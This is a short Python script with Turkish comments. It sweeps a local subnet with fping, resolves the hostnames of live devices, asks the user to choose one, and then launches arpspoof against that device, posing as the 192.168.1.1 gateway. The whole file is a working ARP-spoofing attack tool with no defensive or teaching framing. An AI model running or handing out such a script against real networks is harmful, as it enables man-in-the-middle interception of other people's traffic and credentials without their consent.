import socket
import subprocess

# fping ile IP adreslerini listeleme
result_fping = subprocess.run(
    ["fping", "-a", "-g", "192.168.1.0/24"], 
    capture_output=True, 
    text=True
)

address_list = result_fping.stdout.splitlines()

if not address_list:
    print("No IP addresses found by fping.")
    exit(1)  # Programı sonlandır

# Hostname çözümleme fonksiyonu
def get_device_name(ip_address):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip_address)
        return hostname.replace(".bbrouter", "")
    except socket.herror:
        return "Hostname not found"

# IP adreslerini ve host adlarını sözlükte saklama
devices = {}
for ip in address_list: 
    hostname = get_device_name(ip)
    devices[ip] = hostname  

if not devices:
    print("No devices were resolved.")
    exit(1)

# Cihazların listesini yazdırma
print("\nDiscovered devices:")
for index, (ip, name) in enumerate(devices.items(), start=1):
    print(f"{index}. {ip} - {name}")

print("\n")

# Anahtar listesini alma
key_list = list(devices.keys())

# Kullanıcıdan seçim alma
try:
    choice = int(input("Enter the number of the device you want to ARP spoofing -> "))
    if choice < 1 or choice > len(key_list):
        print("Invalid selection. Exiting.")
        exit(1)
except ValueError:
    print("Invalid input. Please enter a number.")
    exit(1)

# Seçilen cihaza ARP spoofing uygulama
selected_ip = key_list[choice - 1]
print(f"Starting ARP spoofing on {selected_ip}...")

subprocess.run(
    ["arpspoof", "-i", "eth0", "-t", selected_ip, "192.168.1.1"]
)
